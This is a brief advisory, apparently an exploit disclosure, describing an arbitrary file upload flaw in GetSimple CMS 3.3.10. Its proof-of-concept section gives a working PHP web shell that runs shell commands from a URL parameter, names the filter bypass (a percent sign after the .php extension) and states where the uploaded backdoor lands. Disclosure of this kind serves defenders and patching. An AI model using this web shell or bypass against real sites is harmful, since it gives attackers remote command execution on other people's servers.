Description
========================

GetSimple CMS has been downloaded over 120,000 times (as of March 2013).
The magazine t3n assigns GetSimple as "micro" and "Minimal-CMS" one, praises
the simplicity yet possible extensibility through plug-ins.

Vulnerability
========================

GetSimpleCMS Version 3.3.10 suffers from arbitrary file upload vulnerability
which allows an attacker to upload a backdoor.

This vulnerability is that the application uses a blacklist and whitelist
technique to compare the file against mime types and extensions.

Proof of Concept
========================

For exploiting this vulnerability we will create a file by adding the percent
behind extension.
1. evil.php% <--- this is simple trick :)
<?php
// simple backdoor
system($_GET['cmd']);
?>
2. An attacker login to the admin page and uploading the backdoor
3. The uploaded file will be under the "/data/uploads/" folder
